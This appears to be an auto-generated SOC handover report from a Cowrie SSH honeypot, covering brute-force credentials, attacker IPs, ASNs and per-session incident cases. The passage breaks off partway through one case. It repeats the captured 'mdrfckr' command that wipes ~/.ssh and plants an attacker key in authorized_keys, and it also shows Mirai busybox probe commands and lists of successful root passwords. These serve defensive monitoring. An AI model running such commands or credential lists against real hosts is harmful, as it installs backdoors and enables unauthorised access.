# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-13 |
| **Generated At** | 2026-04-13T19:13:02Z |
| **Shift Time** | 19:13 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **75** |
| Confirmed Threats | **73** |
| False Positives Filtered | **2** (2.7%) |
| Unique Attacker IPs | **13** |
| Countries of Origin | **8** |
| High Severity Cases | **23** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **52** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **49** |
| Unique Credential Pairs | **29** |
| Unique Usernames | **16** |
| Unique Passwords | **29** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 23 |
| `345gs5662d34` | 11 |
| `steam` | 2 |
| `user4` | 1 |
| `linda` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 11 |
| `111111` | 1 |
| `zkyd32142` | 1 |
| `Z123456z` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `3245gs5662d34` | 11 |
| `user4` | `111111` | 1 |
| `steam` | `zkyd32142` | 1 |
| `root` | `Z123456z` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Z123456z` | `190.181.27.27` | 2026-04-13T17:05:33 |
| `root` | `3245gs5662d34` | `190.181.27.27` | 2026-04-13T17:05:40 |
| `root` | `Qwe123@` | `190.181.27.27` | 2026-04-13T17:09:06 |
| `root` | `Welcome01` | `190.181.27.27` | 2026-04-13T17:14:27 |
| `root` | `QWERT1234567` | `190.181.27.27` | 2026-04-13T17:23:49 |
| `root` | `Root12@` | `190.181.27.27` | 2026-04-13T17:25:31 |
| `root` | `!1q2w3e4r` | `190.181.27.27` | 2026-04-13T17:29:05 |
| `root` | `#qlalf#wiseit#qjsgh#` | `103.186.1.59` | 2026-04-13T19:03:28 |
| `root` | `3245gs5662d34` | `103.186.1.59` | 2026-04-13T19:03:33 |
| `root` | `123456Ab` | `201.249.205.94` | 2026-04-13T19:04:43 |
| `root` | `3245gs5662d34` | `201.249.205.94` | 2026-04-13T19:04:50 |
| `root` | `cat1029` | `103.210.123.113` | 2026-04-13T19:05:05 |
| `root` | `qazwsx111111!@#` | `120.48.55.25` | 2026-04-13T19:05:54 |
| `root` | `3245gs5662d34` | `120.48.55.25` | 2026-04-13T19:06:06 |
| `root` | `P@ssw0rdwy` | `183.110.63.196` | 2026-04-13T19:06:33 |
| `root` | `3245gs5662d34` | `183.110.63.196` | 2026-04-13T19:06:36 |
| `root` | `huawei12#$` | `103.139.193.223` | 2026-04-13T19:09:17 |
| `root` | `3245gs5662d34` | `103.139.193.223` | 2026-04-13T19:09:22 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **75** |
| Sessions with Fingerprint | **1** |
| Unique HASSH Fingerprints | **1** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 48 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 48 | 7 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 48 | 7 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1082, T1592, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
cat /proc/mounts; /bin/busybox AFAKD
```
Source IPs: `103.210.123.113`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.139.193.223`, `190.181.27.27`, `120.48.55.25`, `103.186.1.59`, `201.249.205.94`, `183.110.63.196`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **13** |
| Unique ASNs | **10** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS136052` | PT Cloud Hosting Indonesia | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS213412` | ONYPHE SAS | 2 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS8048` | CANTV Servicios, Venezuela | 1 | HIGH |
| `AS26210` | AXS Bolivia S. A. | 1 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (23)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9614476bed19

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 17:05 |
| **Last Seen** | 2026-04-13 17:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 17:05:31` | `cowrie.session.connect` |
| `2026-04-13 17:05:31` | `cowrie.client.version` |
| `2026-04-13 17:05:32` | `cowrie.client.kex` |
| `2026-04-13 17:05:33` | `cowrie.login.success` |
| `2026-04-13 17:05:34` | `cowrie.session.params` |
| `2026-04-13 17:05:34` | `cowrie.command.input` |
| `2026-04-13 17:05:34` | `cowrie.command.failed` |
| `2026-04-13 17:05:34` | `cowrie.log.closed` |
| `2026-04-13 17:05:35` | `cowrie.session.params` |
| `2026-04-13 17:05:35` | `cowrie.command.input` |
| `2026-04-13 17:05:35` | `cowrie.session.file_download` |
| `2026-04-13 17:05:35` | `cowrie.log.closed` |
| `2026-04-13 17:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b94936f08308

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 17:05 |
| **Last Seen** | 2026-04-13 17:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 17:05:39` | `cowrie.session.connect` |
| `2026-04-13 17:05:39` | `cowrie.client.version` |
| `2026-04-13 17:05:39` | `cowrie.client.kex` |
| `2026-04-13 17:05:40` | `cowrie.login.success` |
| `2026-04-13 17:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7919d469f0e7

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 17:09 |
| **Last Seen** | 2026-04-13 17:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 17:09:05` | `cowrie.session.connect` |
| `2026-04-13 17:09:05` | `cowrie.client.version` |
| `2026-04-13 17:09:05` | `cowrie.client.kex` |
| `2026-04-13 17:09:06` | `cowrie.login.success` |
| `2026-04-13 17:09:07` | `cowrie.session.params` |
| `2026-04-13 17:09:07` | `cowrie.command.input` |
| `2026-04-13 17:09:07` | `cowrie.command.failed` |
| `2026-04-13 17:09:07` | `cowrie.log.closed` |
| `2026-04-13 17:09:08` | `cowrie.session.params` |
| `2026-04-13 17:09:08` | `cowrie.command.input` |
| `2026-04-13 17:09:08` | `cowrie.session.file_download` |
| `2026-04-13 17:09:08` | `cowrie.log.closed` |
| `2026-04-13 17:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c72797e49ac

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 17:09 |
| **Last Seen** | 2026-04-13 17:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 17:09:12` | `cowrie.session.connect` |
| `2026-04-13 17:09:12` | `cowrie.client.version` |
| `2026-04-13 17:09:12` | `cowrie.client.kex` |
| `2026-04-13 17:09:14` | `cowrie.login.success` |
| `2026-04-13 17:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d5deb899200

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 17:14 |
| **Last Seen** | 2026-04-13 17:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 17:14:25` | `cowrie.session.connect` |
| `2026-04-13 17:14:25` | `cowrie.client.version` |
| `2026-04-13 17:14:26` | `cowrie.client.kex` |
| `2026-04-13 17:14:27` | `cowrie.login.success` |
| `2026-04-13 17:14:28` | `cowrie.session.params` |
| `2026-04-13 17:14:28` | `cowrie.command.input` |
| `2026-04-13 17:14:28` | `cowrie.command.failed` |
| `2026-04-13 17:14:28` | `cowrie.log.closed` |
| `2026-04-13 17:14:29` | `cowrie.session.params` |
| `2026-04-13 17:14:29` | `cowrie.command.input` |
| `2026-04-13 17:14:29` | `cowrie.session.file_download` |
| `2026-04-13 17:14:29` | `cowrie.log.closed` |
| `2026-04-13 17:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dae32079aaa2

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 17:14 |
| **Last Seen** | 2026-04-13 17:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 17:14:33` | `cowrie.session.connect` |
| `2026-04-13 17:14:33` | `cowrie.client.version` |
| `2026-04-13 17:14:33` | `cowrie.client.kex` |
| `2026-04-13 17:14:34` | `cowrie.login.success` |
| `2026-04-13 17:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53fbb3dac4f

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 17:23 |
| **Last Seen** | 2026-04-13 17:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 17:23:47` | `cowrie.session.connect` |
| `2026-04-13 17:23:47` | `cowrie.client.version` |
| `2026-04-13 17:23:47` | `cowrie.client.kex` |
| `2026-04-13 17:23:49` | `cowrie.login.success` |
| `2026-04-13 17:23:49` | `cowrie.session.params` |
| `2026-04-13 17:23:49` | `cowrie.command.input` |
| `2026-04-13 17:23:49` | `cowrie.command.failed` |
| `2026-04-13 17:23:50` | `cowrie.log.closed` |
| `2026-04-13 17:23:50` | `cowrie.session.params` |
| `2026-04-13 17:23:50` | `cowrie.command.input` |
| `2026-04-13 17:23:51` | `cowrie.session.file_download` |
| `2026-04-13 17:23:51` | `cowrie.log.closed` |
| `2026-04-13 17:23:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf1f9a93b529

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 17:23 |
| **Last Seen** | 2026-04-13 17:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 17:23:55` | `cowrie.session.connect` |
| `2026-04-13 17:23:55` | `cowrie.client.version` |
| `2026-04-13 17:23:55` | `cowrie.client.kex` |
| `2026-04-13 17:23:57` | `cowrie.login.success` |
| `2026-04-13 17:23:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80aea8020ed3

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 17:25 |
| **Last Seen** | 2026-04-13 17:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 17:25:29` | `cowrie.session.connect` |
| `2026-04-13 17:25:29` | `cowrie.client.version` |
| `2026-04-13 17:25:30` | `cowrie.client.kex` |
| `2026-04-13 17:25:31` | `cowrie.login.success` |
| `2026-04-13 17:25:32` | `cowrie.session.params` |
| `2026-04-13 17:25:32` | `cowrie.command.input` |
| `2026-04-13 17:25:32` | `cowrie.command.failed` |
| `2026-04-13 17:25:32` | `cowrie.log.closed` |
| `2026-04-13 17:25:33` | `cowrie.session.params` |
| `2026-04-13 17:25:33` | `cowrie.command.input` |
| `2026-04-13 17:25:33` | `cowrie.session.file_download` |
| `2026-04-13 17:25:33` | `cowrie.log.closed` |
| `2026-04-13 17:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d4c893056ea

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 17:25 |
| **Last Seen** | 2026-04-13 17:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 17:25:37` | `cowrie.session.connect` |
| `2026-04-13 17:25:37` | `cowrie.client.version` |
| `2026-04-13 17:25:37` | `cowrie.client.kex` |
| `2026-04-13 17:25:38` | `cowrie.login.success` |
| `2026-04-13 17:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99ace7f26ec1

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 17:29 |
| **Last Seen** | 2026-04-13 17:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 17:29:03` | `cowrie.session.connect` |
| `2026-04-13 17:29:03` | `cowrie.client.version` |
| `2026-04-13 17:29:04` | `cowrie.client.kex` |
| `2026-04-13 17:29:05` | `cowrie.login.success` |
| `2026-04-13 17:29:06` | `cowrie.session.params` |
| `2026-04-13 17:29:06` | `cowrie.command.input` |
| `2026-04-13 17:29:06` | `cowrie.command.failed` |
| `2026-04-13 17:29:06` | `cowrie.log.closed` |
| `2026-04-13 17:29:07` | `cowrie.session.params` |
| `2026-04-13 17:29:07` | `cowrie.command.input` |
| `2026-04-13 17:29:07` | `cowrie.session.file_download` |
| `2026-04-13 17:29:07` | `cowrie.log.closed` |
| `2026-04-13 17:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eb211663c53

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 17:29 |
| **Last Seen** | 2026-04-13 17:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 17:29:11` | `cowrie.session.connect` |
| `2026-04-13 17:29:11` | `cowrie.client.version` |
| `2026-04-13 17:29:11` | `cowrie.client.kex` |
| `2026-04-13 17:29:12` | `cowrie.login.success` |
| `2026-04-13 17:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb728e7818e0

| Field | Detail |
|---|---|
| **Source IP** | `103.186.1[.]59` |
| **First Seen** | 2026-04-13 19:03 |
| **Last Seen** | 2026-04-13 19:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:03:27` | `cowrie.session.connect` |
| `2026-04-13 19:03:27` | `cowrie.client.version` |
| `2026-04-13 19:03:27` | `cowrie.client.kex` |
| `2026-04-13 19:03:28` | `cowrie.login.success` |
| `2026-04-13 19:03:28` | `cowrie.session.params` |
| `2026-04-13 19:03:28` | `cowrie.command.input` |
| `2026-04-13 19:03:28` | `cowrie.command.failed` |
| `2026-04-13 19:03:28` | `cowrie.log.closed` |
